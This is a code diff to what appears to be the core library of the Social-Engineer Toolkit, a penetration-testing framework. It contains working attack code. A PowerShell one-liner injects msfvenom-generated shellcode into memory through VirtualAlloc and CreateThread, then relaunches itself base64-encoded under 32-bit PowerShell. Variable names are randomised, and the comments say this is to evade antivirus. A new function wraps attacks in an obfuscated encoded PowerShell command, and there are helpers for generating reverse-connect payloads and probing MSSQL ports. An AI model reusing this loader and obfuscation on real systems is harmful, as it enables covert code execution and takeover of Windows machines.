+        if not "http" in payload:
+            shellcode = shellcode_replace(ipaddr, port, shellcode).rstrip()
         # sub in \x for 0x
         shellcode = re.sub("\\\\x", "0x", shellcode)
         shellcode = shellcode.replace("\\", "")
@@ -1404,44 +1512,46 @@ def generate_powershell_alphanumeric_payload(payload, ipaddr, port, payload2):
 
     except Exception as e:
         print_error("Something went wrong, printing error: " + str(e))
-    # powershell command here, needs to be unicoded then base64 in order to
-    # use encodedcommand - this incorporates a new process downgrade attack
-    # where if it detects 64 bit it'll use x86 powershell. This is useful so
-    # we don't have to guess if its x64 or x86 and what type of shellcode to
-    # use
-    # added random vars before and after to change strings - AV you are seriously ridiculous.
-    var1 = generate_random_string(3, 4)
-    var2 = generate_random_string(3, 4)
-    var3 = generate_random_string(3, 4)
-    var4 = generate_random_string(3, 4)
-    var5 = generate_random_string(3, 4)
-    var6 = generate_random_string(3, 4)
+
+    # added random vars before and after to change strings - AV you are
+    # seriously ridiculous.
+    var1 = "$" + generate_random_string(2, 2) # $1 
+    var2 = "$" + generate_random_string(2, 2) # $c
+    var3 = "$" + generate_random_string(2, 2) # $2
+    var4 = "$" + generate_random_string(2, 2) # $3
+    var5 = "$" + generate_random_string(2, 2) # $x
+    var6 = "$" + generate_random_string(2, 2) # $t
+    var7 = "$" + generate_random_string(2, 2) # $h
+    var8 = "$" + generate_random_string(2, 2) # $z
+    var9 = "$" + generate_random_string(2, 2) # $g
+    var10 = "$" + generate_random_string(2, 2) # $i
+    var11 = "$" + generate_random_string(2, 2) # $w
 
     # one line shellcode injection with native x86 shellcode
-    powershell_code = (
-        r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-enc ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}""" % shellcode)
+    powershell_code = (r"""$1 = '$t = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $t -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;){Start-Sleep 60};';$h = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-ec ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $h"}else{;iex "& powershell $2 $h";}""" % (shellcode))
 
     # run it through a lame var replace
-    powershell_command = powershell_code.replace("$1", "$" + var1).replace("$c", "$" + var2).replace("$2", "$" + var3).replace("$3", "$" + var4).replace("$x", "$" + var5)
+    powershell_code = powershell_code.replace("$1", var1).replace("$c", var2).replace(
+        "$2", var3).replace("$3", var4).replace("$x", var5).replace("$t", var6).replace(
+        "$h", var7).replace("$z", var8).replace("$g", var9).replace("$i", var10).replace(
+        "$w", var11)
 
     # unicode and base64 encode and return it
-    return base64.b64encode(powershell_command.encode('utf_16_le')).decode("ascii")
+    return base64.b64encode(powershell_code.encode('utf_16_le')).decode("ascii")
 
 # generate base shellcode
 def generate_shellcode(payload, ipaddr, port):
-
     msf_path = meta_path()
     # generate payload
     port = port.replace("LPORT=", "")
-    proc = subprocess.Popen("%smsfvenom -p %s LHOST=%s LPORT=%s StagerURILength=5 StagerVerifySSLCert=false -e x86/shikata_ga_nai -a x86 --platform windows --smallest -f c" %
-                            (msf_path, payload, ipaddr, port), stdout=subprocess.PIPE, shell=True)
+    proc = subprocess.Popen("%smsfvenom -p %s LHOST=%s LPORT=%s StagerURILength=5 StagerVerifySSLCert=false -a x86 --platform windows --smallest -f c" % (msf_path, payload, ipaddr, port), stdout=subprocess.PIPE, shell=True)
     data = proc.communicate()[0]
     data = data.decode('ascii')
     # start to format this a bit to get it ready
-    #repls = {';': '', ' ': '', '+': '', '"': '', '\n': '',
-    #         'unsigned char buf=': '', 'unsignedcharbuf[]=': ''}
-    repls = [';', ' ', '+', '"', '\n', 'unsigned char buf=', 'unsignedcharbuf[]=', "b'", "'", '\\n']
-    for repl in repls: data = data.replace(repl, "")
+    repls = [';', ' ', '+', '"', '\n', 'unsigned char buf=',
+             'unsignedcharbuf[]=', "b'", "'", '\\n']
+    for repl in repls:
+        data = data.replace(repl, "")
     return data
 
 # this will take input for shellcode and do a replace for IP addresses
@@ -1508,6 +1618,8 @@ def shellcode_replace(ipaddr, port, shellcode):
     return shellcode
 
 # exit routine
+
+
 def exit_set():
     cleanup_routine()
     print("\n\n Thank you for " + bcolors.RED + "shopping" + bcolors.ENDC +
@@ -1553,6 +1665,8 @@ def metasploit_shellcode(payload, ipaddr, port):
 
 # here we encrypt via aes, will return encrypted string based on secret
 # key which is random
+
+
 def encryptAES(secret, data):
 
     # the character used for padding--with a block cipher such as AES, the value
@@ -1625,6 +1739,8 @@ class DNSQuery:
         return packet
 
 # main dns routine
+
+
 def dns():
     udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     udps.bind(('', 53))
@@ -1640,15 +1756,20 @@ def dns():
         udps.close()
 
 # start dns
+
+
 def start_dns():
     thread.start_new_thread(dns, ())
 
 # the main ~./set path for SET
+
+
 def setdir():
     if check_os() == "posix":
-        return os.path.join(os.path.expanduser('~'), '.set')
+        return os.path.join(os.path.expanduser('~'), '.set' + '/')
     if check_os() == "windows":
         return "src/program_junk/"
+
 # set the main directory for SET
 setdir = setdir()
 
@@ -1757,35 +1878,45 @@ def get_sql_port(host):
 
     # Build the socket with a .1 second timeout
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.settimeout(.1)
+    s.settimeout(.2)
 
     # Attempt to query UDP:1434 and return MSSQL running port
     try:
-        port = 1434
-        msg = "\x02\x41\x41\x41\x41"
-        s.sendto(msg, (host, port))
-        d = s.recvfrom(1024)
+        sql_port = None
+        try:
+            port = 1434
+            msg = "\x02\x41\x41\x41\x41"
+            s.sendto(msg, (host, port))
+            d = s.recvfrom(1024)
+            sql_port = d[0].split(";")[9]
 
-        sql_port = d[0].split(";")[9]
-        return sql_port
+        # if we have an exception, udp 1434 isnt there could be firewalled off
+        # so we need to check 1433 just in case
+        except:
+            sql_port = "1433"
+            pass
 
-    except:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(.2)
+            s.connect((host, int(sql_port)))
+            return_host = host + ":" + sql_port
+            if return_host != ":" + sql_port:
+                return host + ":" + sql_port
+
+        # if port is closed
+        except:
+            return None
+
+    except Exception as err:
+        print(err)
         pass
 
-# this will manually tcp connect if needed
-def sql_nmap_scan(ipaddr):
-        proc = subprocess.Popen("nmap -v -sT -p1433 %s" % (ipaddr), shell=True, stdout=subprocess.PIPE)
-        output =  proc.communicate()[0].split("\n")
-        result = ""
-        for result in output:
-                if "Discovered open port" in result:
-                        result = result.split("on ")[1]
-	return result
-
 # capture output from a function
+
+
 def capture(func, *args, **kwargs):
     """Capture the output of func when called with the given arguments.
-
     The function output includes any exception raised. capture returns
     a tuple of (function result, standard output, standard error).
     """
@@ -1834,6 +1965,8 @@ def check_kali():
         return "Non-Kali"
 
 # here we give multiple options to specify for SET java applet
+
+
 def applet_choice():
 
     # prompt here
@@ -1841,11 +1974,8 @@ def applet_choice():
 [-------------------------------------------]
 Java Applet Configuration Options Below
 [-------------------------------------------]
-
 Next we need to specify whether you will use your own self generated java applet, built in applet, or your own code signed java applet. In this section, you have all three options available. The first will create a self-signed certificate if you have the java jdk installed. The second option will use the one built into SET, and the third will allow you to import your own java applet OR code sign the one built into SET if you have a certificate.
-
 Select which option you want:
-
 1. Make my own self-signed certificate applet.
 2. Use the applet built into SET.
 3. I have my own code signing certificate or applet.\n""")
@@ -1876,18 +2006,24 @@ Select which option you want:
             module_reload(src.html.unsigned.verified_sign)
 
 # reload module function for python 2 and python 3
+
+
 def module_reload(module):
-    if sys.version_info >= (3,0):
+    if sys.version_info >= (3, 0):
         import importlib
         importlib.reload(module)
     else:
         reload(module)
 
 # used to replace any input that we have from python 2 to python 3
+
+
 def input(string):
-	return raw_input(string)
+    return raw_input(string)
 
 # fetch URL needed for web cloning
+
+
 def fetch_template():
     fileopen = open(setdir + "/site.template").readlines()
     for line in fileopen:
@@ -1901,7 +2037,7 @@ def fetch_template():
 # tail a file
 def tail(filename):
     if os.path.isfile(filename):
-        file = open(filename,'r')
+        file = open(filename, 'r')
         st_results = os.stat(filename)
         st_size = st_results[6]
         file.seek(st_size)
@@ -1913,6 +2049,18 @@ def tail(filename):
                 time.sleep(1)
                 file.seek(where)
             else:
-                print(line,) # already has newline
+                print(line,)  # already has newline
 
-    else: print_error("File not found, cannot tail.")
+    else:
+        print_error("File not found, cannot tail.")
+
+# this will create an obfsucated powershell encoded command string to be
+# used through SET
+def powershell_encodedcommand(ps_attack):
+    ran1 = generate_random_string(1, 2)
+    ran2 = generate_random_string(1, 2)
+    ran3 = generate_random_string(1, 2)
+    ran4 = generate_random_string(1, 2)
+    full_attack = ('powershell -w 1 -C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() \''.format(ran1, ran2, ran3, ran1, ran2, ran3) + ps_attack + '\'"')
+    return full_attack
+    # 'powershell -w 1 -C "sv %s -;sv %s ec;sv %s ((gv %s).value.toString()+(gv %s).value.toString());powershell (gv %s).value.toString() "' % (ran1, ran2, ran3, ran1, ran2, ran3)
